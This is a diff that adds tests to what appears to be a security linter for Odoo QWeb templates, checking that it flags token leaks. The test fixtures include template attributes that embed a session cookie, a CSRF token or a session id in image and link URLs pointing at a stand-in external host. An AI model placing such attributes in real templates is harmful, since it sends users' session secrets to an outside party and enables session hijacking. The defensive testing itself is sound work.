@@ -241,3 +241,18 @@ def test_h5_negative_own_table_dml():
 )
 def test_h6_asyncio_subprocess(src):
     assert ("dangerous-call", "high") in codes(pyt(src))
+
+
+# ---------------------------------------------------------------- H7 token leak sources
+@pytest.mark.parametrize("attr", [
+    """t-attf-src='//e.v/{{request.httprequest.cookies.get("session_id")}}'""",
+    """t-att-src="'https://e.v/?'+request.csrf_token()" """,
+    """t-att-href="'//e.v/?c=' + request.httprequest.cookies['x']" """,
+    """t-attf-href='https://e.v/?s={{request.session.sid}}'""",
+])
+def test_h7_token_leak(attr):
+    assert has(X(f"<template id='t'><img {attr}/></template>"), "qweb-token-leak")
+
+
+def test_h7_local_csrf_ok():
+    assert not has(X("""<template id='t'><img t-att-src="'/web/x?'+request.csrf_token()"/></template>"""), "qweb-token-leak")
